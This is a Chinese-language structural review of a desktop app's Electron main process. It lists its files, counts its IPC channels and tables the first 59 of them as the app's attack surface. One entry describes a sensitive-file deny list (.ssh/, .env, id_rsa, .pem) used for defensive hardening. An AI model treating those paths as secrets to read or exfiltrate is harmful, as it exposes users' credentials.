# r10-desktop-electron —— Electron 主进程与 Python 后端监管(片 H)

> 本片 = `apps/desktop/electron/` 全部 80 个非测试文件(26,639 行),基线
> `863e31318553cda8ad61df681d08175364d4164b`(下文引用后缀 `@ 863e313`)。
> **渲染层 `apps/desktop/src/` 明确不在本片**,本文任何涉及渲染层的话都标注为片外推定。
> 本轮层级是 **L2 结构级理解**:接缝穷举、生命周期与并发模型讲清,实现体留待需要时下钻。

## §1 这一片是什么

Hermes 桌面版是一个 **Electron** 应用。Electron 是"用网页技术写桌面应用"的框架,它把一个
Chromium 浏览器和一个 Node.js 运行时打包在一起,分成两类进程:

- **主进程(main process)**:一个 Node 进程,拥有完整的操作系统权限——能起子进程、读写任意文件、
  开窗口、访问钥匙串。整个应用只有一个主进程。**本片就是它**。
- **渲染进程(renderer process)**:每个窗口一个,跑的是沙箱里的网页(React 界面)。它拿不到 Node,
  想做任何"系统级"的事都必须通过 IPC 请主进程代劳。

两者之间只有一条通道:**IPC(inter-process communication,进程间通信)**,按"通道名"寻址。
主进程用 `ipcMain.handle('通道名', fn)` 注册一个**可返回值**的处理器(渲染侧 `invoke` 调用,
拿到 Promise),或用 `ipcMain.on('通道名', fn)` 注册一个**只收不回**的处理器(渲染侧 `send`)。
反方向由主进程 `webContents.send('通道名', payload)` 推送。

渲染进程并不能直接调 `ipcRenderer`——它被 `contextIsolation`(上下文隔离)挡住了。中间隔着一个
**preload 脚本**:它跑在渲染进程里但享有 Node 权限,用 `contextBridge.exposeInMainWorld` 把
一组精心挑选的函数挂到网页的 `window` 上。**这组函数就是这个应用的全部攻击面**——渲染页面被注入
脚本时,攻击者能做的事恰好等于 preload 暴露的那些函数所覆盖的 IPC 通道。所以 §3 把它逐条列全。

这一片除了 IPC,还干一件更重的活:**把 Python 后端拉起来并监管它**。桌面版不自己实现 agent,
它 spawn 一个 `hermes serve` 子进程(FastAPI/uvicorn 的 HTTP + WebSocket 服务),然后渲染层
直连那个后端的 WebSocket。所以主进程要负责:找到一个能跑的 Python 运行时(ladder)、必要时先跑
安装脚本、spawn、等端口公告、判健康、判死、失败了怎么办。这是 §5.1;它和 Python 侧的
`tui_gateway/host_supervisor.py` 是**同一个问题的第二套实现**,§5.2 逐项对照。


## §2 文件清单(80 个,逐个全路径)

行数取自基线 `wc -l`。合计 **26,639** 行,与派工清单一致。

### 2.1 主体与桥(2 个,12,393 行 = 全片 46.5%)

| 全路径 | 行 | 角色 |
|---|---|---|
| `apps/desktop/electron/main.ts` | 12038 | 主进程唯一入口。126 个 IPC 处理器、6 类窗口的创建、后端拉起与监管、更新/卸载/深链/菜单/终端 PTY/剪贴板/通知,全部在这一个文件里落地;纯逻辑被切到旁边 77 个模块。 |
| `apps/desktop/electron/preload.ts` | 355 | 唯一的预加载脚本,只暴露一个全局命名空间 `hermesDesktop`(152 个叶函数)。全片只有这一处 `contextBridge`。 |

### 2.2 后端生命周期(10 个)

| 全路径 | 行 | 角色 |
|---|---|---|
| `apps/desktop/electron/backend-child.ts` | 55 | 停子进程的平台分支:Windows 树杀(taskkill /T /F),POSIX 普通 SIGTERM。 |
| `apps/desktop/electron/backend-command.ts` | 48 | 后端子命令路由:正规形态是 `serve`,老运行时回退 `dashboard --no-open`;用正则读远端 `dashboard.py` 源码判断它认不认 `serve`。 |
| `apps/desktop/electron/backend-connection-state.ts` | 84 | 带 generation 计数的连接状态机:一次"旧的启动"迟到的 exit/error 不能清掉"新的启动"的进程与 promise。 |
| `apps/desktop/electron/backend-env.ts` | 161 | 拼后端子进程的 PATH / PYTHONPATH / PYTHONUTF8;Hermes 托管 Node 的两种磁盘布局都进 PATH。 |
| `apps/desktop/electron/backend-health.ts` | 169 | 就绪判定:轮询 `/api/health`,遇 404 或"网关形状的 401"回退 `/api/status`;带凭据探针收到 401/403 直接判需要重新登录。 |
| `apps/desktop/electron/backend-probes.ts` | 221 | 候选运行时的冒烟探针:`<hermes> --version` 与 `python -c "import yaml; import dotenv; import hermes_cli.config"`,超时自动重试一次。 |
| `apps/desktop/electron/backend-ready.ts` | 206 | 端口公告等待:解析 stdout 的 `HERMES_(BACKEND|DASHBOARD)_READY port=N`,或(Windows pythonw 无 stdout 时)轮询 ready 文件 JSON。 |
| `apps/desktop/electron/backend-start-failure.ts` | 72 | 纯判定:本地启动失败要 latch(锁死,防重装环),远端失败不 latch(多为瞬时);确认的 reauth 拒绝单独 latch。 |
| `apps/desktop/electron/primary-backend-startup.ts` | 65 | 主后端启动编排:远端优先 → 首启选择门 → 更新互斥等待 → 本地 spawn,这几步的组合顺序。 |
| `apps/desktop/electron/primary-connection-rehome.ts` | 35 | 连接模式切换时的"软换家":拆掉主后端并通知渲染层重连,而不重载窗口。 |

### 2.3 首启引导与安装(5 个)

| 全路径 | 行 | 角色 |
|---|---|---|
| `apps/desktop/electron/active-runtime-state.ts` | 58 | 纯判定:bootstrap marker 是否有效,以及"marker 无效但运行时可用"时该走哪条路。 |
| `apps/desktop/electron/bootstrap-platform.ts` | 110 | WSL 检测、远程显示(X11 转发 / VNC / RDP)检测、"WSL 里指向 Windows 二进制"的识别。 |
| `apps/desktop/electron/bootstrap-repair-guard.ts` | 121 | 纯决策:前 3 次"修复"只软重启,超预算才硬重装,防 #74874 的无限重装环。 |
| `apps/desktop/electron/bootstrap-runner.ts` | 1037 | 分阶段驱动 `scripts/install.ps1` / `install.sh`,把 manifest/stage/log/complete/failed 事件流回渲染层;含安装脚本的下载与缓存。 |
| `apps/desktop/electron/first-run-setup-gate.ts` | 146 | 首启"本地安装 vs 连已有网关"的选择门,含"卡多久算卡住"的计时与重试重置。 |

### 2.4 连接配置、远端与鉴权(15 个)

| 全路径 | 行 | 角色 |
|---|---|---|
| `apps/desktop/electron/connection-apply.ts` | 57 | 应用一次连接变更的编排:取消在飞 SSH bootstrap → 拆 SSH → 拆后端 → 通知渲染层。 |
| `apps/desktop/electron/connection-config.ts` | 589 | 纯逻辑:远端 URL 归一化、WS URL 构造(静态 token vs OAuth 一次性 ticket)、auth mode 分类与强制规则、profile→后端路由表。 |
| `apps/desktop/electron/dashboard-token.ts` | 112 | 抓后端首页 HTML 里注入的 `window.__HERMES_SESSION_TOKEN__`,认领"后端实际发的那个 token";并识别"端口被非我方进程占用"。 |
| `apps/desktop/electron/gateway-ws-probe.ts` | 227 | 真开一次 `/api/ws` WebSocket 验证凭据,补 HTTP 探针的假阳性(HTTP 通、WS 被拒)。 |
| `apps/desktop/electron/native-auth-decisions.ts` | 144 | RFC 8252 原生登录里三个纯决策:请求体不能预 stringify、OAuth REST 走 bearer 还是 cookie、就绪探针用不用凭据。 |
| `apps/desktop/electron/native-oauth.ts` | 239 | RFC 8252(原生应用 OAuth)的纯逻辑:PKCE、授权 URL 构造、回调解析、token 响应归一化、过期判定。 |
| `apps/desktop/electron/native-oauth-login.ts` | 215 | 上面那套的 I/O 外壳:起 loopback HTTP 监听、开系统浏览器、拿 code 换 token。依赖全注入。 |
| `apps/desktop/electron/native-token-store.ts` | 165 | 原生 OAuth token 的加密落盘层(safeStorage 加密 → userData 文件),重启后恢复。 |
| `apps/desktop/electron/oauth-net-request.ts` | 17 | Electron `net.request` 的两个小助手:序列化 JSON body、只设 Content-Type(Chromium 禁止应用设 Content-Length)。 |
| `apps/desktop/electron/remote-lifecycle.ts` | 907 | 通过 SSH 隧道拉起/复用远端 Hermes 后端的纯逻辑:远端安装定位、`uname` 平台门、锁文件复用 + 带鉴权的 `/api/status` 证明。 |
| `apps/desktop/electron/remote-liveness.ts` | 244 | 远端存活跟踪:每个 baseUrl 独立的失败连击计数(3 次 / 60s 窗口)+ 多窗口并发探测的合流器。 |
| `apps/desktop/electron/ssh-bootstrap-coordinator.ts` | 131 | SSH bootstrap 的并发协调:配置指纹、租约、取消并等待、强制清理。 |
| `apps/desktop/electron/ssh-config.ts` | 175 | 只读解析用户的 `~/.ssh/config`:`Host` 别名(给设置页做建议)、`Include` 展开、`ssh -G` 输出解析。 |
| `apps/desktop/electron/ssh-connection.ts` | 921 | 基于系统 `ssh` 客户端的 ControlMaster 连接管理(端口转发、交互式参数、密钥/跳板机全部继承自 ssh 配置),含日志脱敏。 |
| `apps/desktop/electron/windows-remote-lifecycle.ts` | 462 | 远端是 Windows 时的那一套:PowerShell 字面量转义、锁文件 schema v2、READY 行轮询、平台探测。 |

### 2.5 多 profile 路由(3 个)

| 全路径 | 行 | 角色 |
|---|---|---|
| `apps/desktop/electron/profile-delete-routing.ts` | 95 | 纯逻辑:`DELETE /api/profiles/<name>` 之后,下一次请求必须绕开那个 profile 的池后端,否则新 spawn 的后端会把刚删的目录重建出来(#52279)。 |
| `apps/desktop/electron/profile-session-routing.ts` | 19 | 主 profile 的会话列表取数(给"多 profile 合并列表"用的一段)。 |
| `apps/desktop/electron/workspace-cwd.ts` | 34 | 判断一个目录是否落在打包后的安装树里(用来拒绝把工作目录设成应用包内)。 |

### 2.6 窗口、输入与呈现(14 个)

| 全路径 | 行 | 角色 |
|---|---|---|
| `apps/desktop/electron/main-window-lifecycle.ts` | 28 | "确保主窗口存在"的纯判定(app 是否 ready、要不要聚焦已有窗口)。 |
| `apps/desktop/electron/session-windows.ts` | 162 | 二级会话窗口:共享的 `webPreferences`(唯一定义处)、窗口 URL 构造、按 sessionId 去重的注册表、实例窗口的层叠偏移。 |
| `apps/desktop/electron/window-state.ts` | 148 | `window-state.json` 的纯几何逻辑:尺寸/位置/最大化的清洗与离屏矫正。 |
| `apps/desktop/electron/titlebar-overlay-width.ts` | 42 | 原生窗口控件覆盖层(最小化/最大化/关闭)的**预留宽度回退值**;布局后渲染层用 `navigator.windowControlsOverlay` 读真值。 |
| `apps/desktop/electron/zoom.ts` | 117 | 缩放的纯换算:百分比 ↔ Chromium zoom level(factor = 1.2^level)与钳位;默认 90%。 |
| `apps/desktop/electron/find-in-page.ts` | 120 | 页内查找(Ctrl/Cmd+F)的纯逻辑与结果转发:按 `event.sender` 定位窗口,所以二级窗口里按 Cmd+F 搜的是它自己。 |
| `apps/desktop/electron/link-title-window.ts` | 75 | 隐藏窗口抓网页 `<title>`(curl 抓不到时的二档):必须静音、禁下载,因为它加载的是任意用户链接。 |
| `apps/desktop/electron/quick-entry.ts` | 421 | Quick Entry(全局热键小输入框)的纯逻辑:Electron accelerator 词表与校验、窗口位置、设置清洗。 |
| `apps/desktop/electron/quit-guard.ts` | 92 | 退出确认:渲染层上报"哪些会话正在跑",主进程合并后决定要不要弹确认框,以及弹什么文案。 |
| `apps/desktop/electron/stream-throttle.ts` | 119 | 后台节流的运行时开关:任一会话在跑就给所有聊天窗口关掉 Chromium 后台节流,全部跑完再打开(修"最小化时 20% CPU")。 |
| `apps/desktop/electron/wake-indicator.ts` | 34 | 唤醒词指示器的纯常量与几何(状态枚举 hidden/detected/capturing、窗口尺寸、选屏)。 |
| `apps/desktop/electron/wake-indicator-window.ts` | 174 | 上面那个指示器的 BrowserWindow 控制器(显示/淡出/跟随显示器变化重定位)。 |
| `apps/desktop/electron/event-dedupe.ts` | 32 | 跨窗口一次性副作用的去重(通知、回合结束音、朗读):主进程串行处理 IPC,天然是无竞争的裁判。 |
| `apps/desktop/electron/power-save.ts` | 50 | 保持唤醒:持有一个全局 `powerSaveBlocker`('prevent-app-suspension')。 |

### 2.7 文件系统、Git 与终端能力(6 个)

| 全路径 | 行 | 角色 |
|---|---|---|
| `apps/desktop/electron/hardening.ts` | 366 | IPC 文件访问的加固层:路径语法拒绝(NUL、Windows 设备路径)、`~` 展开、`file:` URL 解析、敏感文件黑名单(`.ssh/`、`.env`、`id_rsa`、`.pem`…)、大小上限、safeStorage 加密。 |
| `apps/desktop/electron/fs-read-dir.ts` | 111 | 目录列举的 IPC 实现:并发 stat(上限 16)、隐藏噪声目录过滤、WSL 路径桥接。 |
| `apps/desktop/electron/git-root.ts` | 50 | 向上找 `.git`(最多 50 层),给渲染层判断"这个目录属于哪个仓库"。 |
| `apps/desktop/electron/git-repo-scan.ts` | 168 | 仓库发现:在有界的根目录下并发遍历找 Git 仓库(默认深度 3、并发 32、跳过 node_modules 等)。 |
| `apps/desktop/electron/git-worktree-ops.ts` | 518 | worktree 增删查 + 分支切换/列举("开始工作"流程),直接 shell 到 git。 |
| `apps/desktop/electron/git-review-ops.ts` | 725 | 评审面板的 git 操作:基于 `simple-git` 的 status/diff/stage/unstage/revert/commit/push,以及走 `gh` 的建 PR。 |

### 2.8 更新与卸载(9 个)

| 全路径 | 行 | 角色 |
|---|---|---|
| `apps/desktop/electron/update-count.ts` | 30 | 纯判定:浅克隆且无 merge-base 时 `rev-list --count` 会给出天文数字,该跳过它改用 SHA 比对(#51922)。 |
| `apps/desktop/electron/update-gate.ts` | 95 | 纯门控:更新在跑时不许 spawn 本地后端(两个信号——磁盘 marker + 进程存活)。 |
| `apps/desktop/electron/update-marker.ts` | 182 | 更新互斥 marker `HERMES_HOME/.hermes-update-in-progress` 的读写与交接冲突判定(#50238)。 |
| `apps/desktop/electron/update-rebuild.ts` | 29 | 自更新中 `--build-only` 重建的"失败重试一次"策略。 |
| `apps/desktop/electron/update-relaunch.ts` | 314 | Linux 就地更新后的重启决策与脚本生成(#45205),含沙箱预检与 `--no-sandbox` 回退。 |
| `apps/desktop/electron/update-remote.ts` | 65 | 被动更新检查时改用公共 HTTPS `ls-remote`,避免 FIDO2 SSH key 弹硬件触摸提示。 |
| `apps/desktop/electron/updater-process.ts` | 141 | 定位已 staged 的 updater 可执行文件、判断它支不支持预写 marker、以分离进程 spawn 它。 |
| `apps/desktop/electron/venv-blocker-scan.ts` | 214 | 更新前置检查:子进程跑 Python 的 venv 占用扫描,把结果转成可读消息。 |
| `apps/desktop/electron/desktop-uninstall.ts` | 268 | 卸载三档(仅 GUI / Lite / Full)到 `hermes uninstall` 参数的映射、应用包路径解析、各 OS 的分离清理脚本生成。 |

### 2.9 平台补丁族(11 个)

| 全路径 | 行 | 角色 |
|---|---|---|
| `apps/desktop/electron/windows-child-options.ts` | 37 | 所有 Windows 子进程统一 `windowsHide: true`,避免闪黑框。 |
| `apps/desktop/electron/windows-hermes-path.ts` | 291 | Windows 上解析 `hermes` 的三个坑:PATHEXT 候选顺序、venv shim 拆包、updater 参数选择。 |
| `apps/desktop/electron/windows-sandbox-fallback.ts` | 394 | Windows 上 GPU/渲染器沙箱 STATUS_BREAKPOINT 崩溃的恢复梯子(#38216):ACL 修复 → `--no-sandbox` 重启 → 粘滞 marker。 |
| `apps/desktop/electron/windows-system-ca.ts` | 53 | 把 Windows 系统 CA 证书灌进 Node 的默认信任集(企业 TLS 中间人环境)。 |
| `apps/desktop/electron/windows-user-env.ts` | 99 | 直接读注册表 `HKCU\Environment`,绕过"GUI 应用继承登录时环境快照"导致 `setx` 后看不到新值的问题(#45471)。 |
| `apps/desktop/electron/wsl-clipboard-image.ts` | 102 | WSL2 里通过 PowerShell 取 Windows 宿主剪贴板的图片(WSLg 只桥接文本)。 |
| `apps/desktop/electron/wsl-path-bridge.ts` | 137 | 把 WSL/POSIX 路径桥成 Windows 宿主能打开的形式(原生文件对话框的 defaultPath、读文件路径)。 |
| `apps/desktop/electron/find-git-bash.ts` | 67 | Windows 上定位 `bash.exe`(env 覆盖 → PortableGit → 常规安装位置 → PATH)。 |
| `apps/desktop/electron/spawn-helper-perms.ts` | 122 | 给 node-pty 的 POSIX `spawn-helper` 补执行位(npm 包里是 0644,dev 流程无人 chmod)。 |
| `apps/desktop/electron/dev-cdp.ts` | 108 | 开发态才开 Chrome DevTools 协议端口(默认 9222);**打包后必须关**是这个模块唯一的硬门。 |
| `apps/desktop/electron/desktop-installation.ts` | 137 | 生成/读取本机安装 ID(UUIDv4)与 SSH 归属 ID,用于远端锁文件的归属判定。 |

### 2.10 安全意图专件(3 个)

| 全路径 | 行 | 角色 |
|---|---|---|
| `apps/desktop/electron/crash-forensics.ts` | 51 | 把主进程的 `uncaughtException` / `unhandledRejection` 写进 desktop.log 并**同步**刷盘(从 Finder/开始菜单启动时 stderr 是丢弃的)。 |
| `apps/desktop/electron/embed-referer.ts` | 48 | 只在 `persist:hermes-embed` 这个 webview 分区里,给 YouTube 系域名补 `Referer`;其它域名原样放行。 |
| `apps/desktop/electron/vscode-marketplace.ts` | 337 | 从 VS Code 市场取配色主题:自己解析 `.vsix`(zip)中央目录,只抽 `package.json` 与主题 JSON 文本,**不执行任何扩展代码**。 |

### 2.11 macOS 打包描述文件(2 个)

| 全路径 | 行 | 角色 |
|---|---|---|
| `apps/desktop/electron/entitlements.mac.plist` | 16 | 主应用的 macOS 授权清单(entitlements),在 `apps/desktop/package.json` 的 `build.mac.entitlements` 里被引用。声明 5 项:allow-jit、allow-unsigned-executable-memory、disable-library-validation、device.audio-input、device.camera。 |
| `apps/desktop/electron/entitlements.mac.inherit.plist` | 16 | 同上,给**子进程/helper 应用**用(`build.mac.entitlementsInherit`)。与上一份**逐字节相同**——见 §6 ◇-3。 |

> 派工书提到本片含 `.manifest`。**实测本片没有 `.manifest` 文件**;全仓唯一一个是
> `apps/bootstrap-installer/src-tauri/hermes-setup.manifest`,属于另一片。
> 搜索面:`find . -name "*.manifest" -not -path "./node_modules/*"`,全仓一处命中,不在 `apps/desktop/` 下。


## §3 接缝穷举

本片有 8 个对外接缝。逐个列全 + 给机械枚举命令 + 报条数。

### 3.0 总账

| 接缝 | 条数 | 定义处 |
|---|---|---|
| 渲染→主:`ipcMain.handle`(有返回值) | **110** | `apps/desktop/electron/main.ts` |
| 渲染→主:`ipcMain.on`(只收不回) | **16** | `apps/desktop/electron/main.ts` |
| 主→渲染:推送通道(preload 里 `ipcRenderer.on`) | **23**(其中 4 条是中继,与上面 16 条重名) | main.ts / find-in-page.ts / zoom.ts / wake-indicator-window.ts |
| **静态通道名去重合计** | **145** | |
| 动态通道族(每个终端会话两条) | **2 族** | `apps/desktop/electron/main.ts` |
| preload `contextBridge` 叶函数 | **152** | `apps/desktop/electron/preload.ts` |
| preload 顶层键 | **94**(其中 13 个是命名空间对象) | 同上 |
| bootstrap 事件类型 | **8** | main.ts + bootstrap-runner.ts |
| boot 进度 phase | **12** | `apps/desktop/electron/main.ts` |
| 本片读取的 `HERMES_*` 环境变量 | **28** | 全片 |
| userData 落盘文件/目录 | **15** | `apps/desktop/electron/main.ts` |

**一个重要的完整性事实:126 条渲染→主通道与 preload 的 110 个 `invoke` + 16 个 `send` 是
严格一一对应的,零缺口、零多余。** 也就是说:没有"注册了但没暴露"的隐藏通道,也没有"暴露了
但主进程没接"的死调用。

```verify
cd /home/user/hermes-agent && python3 - <<'EOF'
import re
main = open('apps/desktop/electron/main.ts').read()
pre  = open('apps/desktop/electron/preload.ts').read()
h = set(re.findall(r"ipcMain\.handle\(\s*'([^']+)'", main))
o = set(re.findall(r"ipcMain\.on\(\s*'([^']+)'", main))
i = set(re.findall(r"ipcRenderer\.invoke\(\s*'([^']+)'", pre))
s = set(re.findall(r"ipcRenderer\.send\(\s*'([^']+)'", pre))
l = set(re.findall(r"ipcRenderer\.on\(\s*'([^']+)'", pre))
print("handle=%d on=%d invoke=%d send=%d listen=%d" % (len(h), len(o), len(i), len(s), len(l)))
print("handle-invoke:", sorted(h - i), " invoke-handle:", sorted(i - h))
print("on-send:", sorted(o - s), " send-on:", sorted(s - o))
print("distinct static names:", len(h | o | l))
EOF
```

实测输出:`handle=110 on=16 invoke=110 send=16 listen=23`、四个差集全空、`distinct static names: 145`。


### 3.1 渲染进程 → 主进程:全部 126 条通道

**这是本片最有价值的产出:这 126 条就是这个桌面应用的全部攻击面。**
`kind=handle` 表示有返回值(渲染侧 `await invoke`),`kind=on` 表示只收不回(渲染侧 `send`)。
锚点列单独成格、不带内联摘录,故校验器按约定记 TABLE-UNCHECKED(非阻断)。

机械枚举命令(输出 126 行,按通道名排序):

```verify
cd /home/user/hermes-agent && grep -nE "ipcMain\.(handle|on)\(" apps/desktop/electron/main.ts \
  | sed -E "s/^([0-9]+):.*ipcMain\.(handle|on)\(\s*'([^']+)'.*/\3\t\2\tmain.ts:\1/" | sort | tee /dev/stderr | wc -l
```

| # | 通道名 | kind | preload API | 注册处 | 一句话用途 |
|---:|---|---|---|---|---|
| 1 | `hermes:active-work` | on | `hermesDesktop.setActiveWork` | `apps/desktop/electron/main.ts:10596` | 渲染层上报"我这边哪些会话在跑"(喂退出守卫 + 后台节流) |
| 2 | `hermes:ambient:claim` | handle | `hermesDesktop.claimAmbientCue` | `apps/desktop/electron/main.ts:10328` | 多窗口环境音/朗读的抢占:第一个 claim 的窗口负责发声 |
| 3 | `hermes:api` | handle | `hermesDesktop.api` | `apps/desktop/electron/main.ts:10250` | 把一次 REST 调用代理到(本地/池/远端)后端,带上凭据 |
| 4 | `hermes:backend:touch` | handle | `hermesDesktop.touchBackend` | `apps/desktop/electron/main.ts:9535` | 给池后端续命,免得被空闲回收器杀掉 |
| 5 | `hermes:boot-progress:get` | handle | `hermesDesktop.getBootProgress` | `apps/desktop/electron/main.ts:9793` | 读启动进度快照(devtools 重载后恢复覆盖层用) |
| 6 | `hermes:bootstrap:cancel` | handle | `hermesDesktop.cancelBootstrap` | `apps/desktop/electron/main.ts:9777` | 取消正在跑的安装脚本 |
| 7 | `hermes:bootstrap:continue-local` | handle | `hermesDesktop.continueBootstrapLocal` | `apps/desktop/electron/main.ts:9771` | 首启选择门里选了"本地安装" |
| 8 | `hermes:bootstrap:get` | handle | `hermesDesktop.getBootstrapState` | `apps/desktop/electron/main.ts:9794` | 读 bootstrap 全量快照(manifest/stages/日志环) |
| 9 | `hermes:bootstrap:repair` | handle | `hermesDesktop.repairBootstrap` | `apps/desktop/electron/main.ts:9719` | "修复":按修复守卫决定软重启还是硬重装 |
| 10 | `hermes:bootstrap:reset` | handle | `hermesDesktop.resetBootstrap` | `apps/desktop/electron/main.ts:9705` | "重载重试":清掉锁死的失败并拆后端 |
| 11 | `hermes:cloud:agent-sign-in` | handle | `hermesDesktop.cloud.agentSignIn` | `apps/desktop/electron/main.ts:9945` | 用门户会话静默登录某个 agent |
| 12 | `hermes:cloud:discover` | handle | `hermesDesktop.cloud.discover` | `apps/desktop/electron/main.ts:9940` | 发现该组织下的 cloud agent 列表 |
| 13 | `hermes:cloud:login` | handle | `hermesDesktop.cloud.login` | `apps/desktop/electron/main.ts:9930` | 开门户登录窗 |
| 14 | `hermes:cloud:logout` | handle | `hermesDesktop.cloud.logout` | `apps/desktop/electron/main.ts:9935` | 登出门户 |
| 15 | `hermes:cloud:status` | handle | `hermesDesktop.cloud.status` | `apps/desktop/electron/main.ts:9926` | Hermes Cloud 门户会话状态 |
| 16 | `hermes:connection` | handle | `hermesDesktop.getConnection` | `apps/desktop/electron/main.ts:9471` | 要一个可用的后端连接;不存在就拉起(本片的核心入口) |
| 17 | `hermes:connection-config:apply` | handle | `hermesDesktop.applyConnectionConfig` | `apps/desktop/electron/main.ts:9957` | 应用连接配置(软换家:拆后端 + 通知渲染层重连) |
| 18 | `hermes:connection-config:get` | handle | `hermesDesktop.getConnectionConfig` | `apps/desktop/electron/main.ts:9795` | 读脱敏后的连接配置 |
| 19 | `hermes:connection-config:oauth-login` | handle | `hermesDesktop.oauthLoginConnectionConfig` | `apps/desktop/electron/main.ts:9844` | 开 OAuth 登录窗(cookie 会话) |
| 20 | `hermes:connection-config:oauth-logout` | handle | `hermesDesktop.oauthLogoutConnectionConfig` | `apps/desktop/electron/main.ts:9905` | 清 OAuth 会话 cookie 与原生 token |
| 21 | `hermes:connection-config:probe` | handle | `hermesDesktop.probeConnectionConfig` | `apps/desktop/electron/main.ts:9843` | 探测远端用的是 token 还是 OAuth 鉴权 |
| 22 | `hermes:connection-config:save` | handle | `hermesDesktop.saveConnectionConfig` | `apps/desktop/electron/main.ts:9951` | 保存连接配置(token 走 safeStorage 加密) |
| 23 | `hermes:connection-config:test` | handle | `hermesDesktop.testConnectionConfig` | `apps/desktop/electron/main.ts:9842` | 完整测试一套连接配置(HTTP + WS 都要过) |
| 24 | `hermes:connection:revalidate` | handle | `hermesDesktop.revalidateConnection` | `apps/desktop/electron/main.ts:9480` | 唤醒后确认缓存的主连接还活着,远端不通就丢缓存 |
| 25 | `hermes:data-url-read-max:get` | handle | `hermesDesktop.dataUrlReadMax.get` | `apps/desktop/electron/main.ts:10411` | 读 data-URL 读取上限(MB) |
| 26 | `hermes:data-url-read-max:set` | handle | `hermesDesktop.dataUrlReadMax.set` | `apps/desktop/electron/main.ts:10418` | 写 data-URL 读取上限 |
| 27 | `hermes:deep-link-ready` | handle | `hermesDesktop.signalDeepLinkReady` | `apps/desktop/electron/main.ts:11766` | 渲染层宣告"我可以接深链了",主进程把暂存的链接投递过去 |
| 28 | `hermes:fetchLinkTitle` | handle | `hermesDesktop.fetchLinkTitle` | `apps/desktop/electron/main.ts:10865` | 抓链接标题(curl 一档 + 隐藏窗口二档,带缓存与并发上限) |
| 29 | `hermes:find-in-page` | handle | `hermesDesktop.findInPage` | `apps/desktop/electron/main.ts:10791` | 在发起窗口里做页内查找 |
| 30 | `hermes:fs:desktopPluginsRoot` | handle | `hermesDesktop.desktopPluginsRoot` | `apps/desktop/electron/main.ts:11130` | 返回本机(而非远端)的 desktop-plugins 目录,按需创建 |
| 31 | `hermes:fs:gitRoot` | handle | `hermesDesktop.gitRoot` | `apps/desktop/electron/main.ts:11082` | 从某路径向上找 git 根 |
| 32 | `hermes:fs:openDir` | handle | `hermesDesktop.openDir` | `apps/desktop/electron/main.ts:11106` | 打开一个目录(不存在就先 mkdir -p) |
| 33 | `hermes:fs:readDir` | handle | `hermesDesktop.readDir` | `apps/desktop/electron/main.ts:11080` | 列目录(加固:路径语法 + realpath + 噪声过滤) |
| 34 | `hermes:fs:rename` | handle | `hermesDesktop.renamePath` | `apps/desktop/electron/main.ts:11151` | 同目录内改名(目标名不许含分隔符,不许移动) |
| 35 | `hermes:fs:reveal` | handle | `hermesDesktop.revealPath` | `apps/desktop/electron/main.ts:11085` | 在文件管理器里选中某个已存在的条目 |
| 36 | `hermes:fs:trash` | handle | `hermesDesktop.trashPath` | `apps/desktop/electron/main.ts:11204` | 把文件/目录移到系统回收站 |
| 37 | `hermes:fs:writeText` | handle | `hermesDesktop.writeTextFile` | `apps/desktop/electron/main.ts:11178` | 写一个小 UTF-8 文本文件(父目录必须已存在,内容 ≤1e6 字符) |
| 38 | `hermes:gateway:ws-url` | handle | `hermesDesktop.getGatewayWsUrl` | `apps/desktop/electron/main.ts:9540` | 要一条新鲜的网关 WebSocket URL(OAuth 模式下每次现铸 ticket) |
| 39 | `hermes:get-remote-display-reason` | handle | `hermesDesktop.getRemoteDisplayReason` | `apps/desktop/electron/main.ts:430` | 本机是否跑在远程显示上(X11 转发/VNC/RDP),渲染层据此降级动效 |
| 40 | `hermes:git:baseBranchList` | handle | `hermesDesktop.git.baseBranchList` | `apps/desktop/electron/main.ts:11234` | 列可作为 base 的分支 |
| 41 | `hermes:git:branchList` | handle | `hermesDesktop.git.branchList` | `apps/desktop/electron/main.ts:11232` | 列分支 |
| 42 | `hermes:git:branchSwitch` | handle | `hermesDesktop.git.branchSwitch` | `apps/desktop/electron/main.ts:11228` | 切分支 |
| 43 | `hermes:git:fileDiff` | handle | `hermesDesktop.git.fileDiff` | `apps/desktop/electron/main.ts:11251` | 相对 HEAD 的单文件 diff |
| 44 | `hermes:git:repoStatus` | handle | `hermesDesktop.git.repoStatus` | `apps/desktop/electron/main.ts:11239` | 仓库状态(分支、ahead/behind、脏否) |
| 45 | `hermes:git:review:commit` | handle | `hermesDesktop.git.review.commit` | `apps/desktop/electron/main.ts:11266` | 提交(可选顺带 push) |
| 46 | `hermes:git:review:commitContext` | handle | `hermesDesktop.git.review.commitContext` | `apps/desktop/electron/main.ts:11269` | 给"生成提交信息"用的上下文 |
| 47 | `hermes:git:review:createPr` | handle | `hermesDesktop.git.review.createPr` | `apps/desktop/electron/main.ts:11274` | 走 gh 建 PR |
| 48 | `hermes:git:review:diff` | handle | `hermesDesktop.git.review.diff` | `apps/desktop/electron/main.ts:11247` | 单文件 diff |
| 49 | `hermes:git:review:list` | handle | `hermesDesktop.git.review.list` | `apps/desktop/electron/main.ts:11244` | 评审面板的变更文件列表(scope: 未提交/分支/上一回合) |
| 50 | `hermes:git:review:push` | handle | `hermesDesktop.git.review.push` | `apps/desktop/electron/main.ts:11272` | 推送 |
| 51 | `hermes:git:review:revParse` | handle | `hermesDesktop.git.review.revParse` | `apps/desktop/electron/main.ts:11263` | 解析一个 ref |
| 52 | `hermes:git:review:revert` | handle | `hermesDesktop.git.review.revert` | `apps/desktop/electron/main.ts:11260` | 还原一个文件 |
| 53 | `hermes:git:review:shipInfo` | handle | `hermesDesktop.git.review.shipInfo` | `apps/desktop/electron/main.ts:11273` | 走 gh 查当前分支的 PR 状态 |
| 54 | `hermes:git:review:stage` | handle | `hermesDesktop.git.review.stage` | `apps/desktop/electron/main.ts:11254` | 暂存一个文件 |
| 55 | `hermes:git:review:unstage` | handle | `hermesDesktop.git.review.unstage` | `apps/desktop/electron/main.ts:11257` | 取消暂存 |
| 56 | `hermes:git:scanRepos` | handle | `hermesDesktop.git.scanRepos` | `apps/desktop/electron/main.ts:11280` | 在给定根目录下扫描 Git 仓库 |
| 57 | `hermes:git:worktreeAdd` | handle | `hermesDesktop.git.worktreeAdd` | `apps/desktop/electron/main.ts:11220` | 新建 worktree(带新分支) |
| 58 | `hermes:git:worktreeList` | handle | `hermesDesktop.git.worktreeList` | `apps/desktop/electron/main.ts:11218` | 列 worktree |
| 59 | `hermes:git:worktreeRemove` | handle | `hermesDesktop.git.worktreeRemove` | `apps/desktop/electron/main.ts:11224` | 删 worktree |
